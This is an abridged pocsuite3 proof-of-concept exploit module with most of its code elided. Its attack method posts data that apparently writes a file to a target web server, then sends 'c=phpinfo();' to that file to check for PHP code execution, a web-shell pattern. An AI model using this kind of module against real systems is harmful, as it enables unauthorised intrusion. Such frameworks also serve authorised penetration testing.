...
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE, logger
...
class DemoPOC(POCBase):
    ...
    def _check(self, url):
        ...
        for payload in payloads:
            ...
            try:
                r = requests.post(vul_url, data=data, headers=headers, timeout=10)
    ...
    def _attack(self):
        ...
        try:
            requests.post(vul_url, data=data, headers=headers, timeout=10)
        except Exception as ex:
            logger.warn(str(ex))
        try:
            r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers, timeout=10)
        except Exception as ex:
            logger.warn(str(ex))
            return self.parse_output(result)
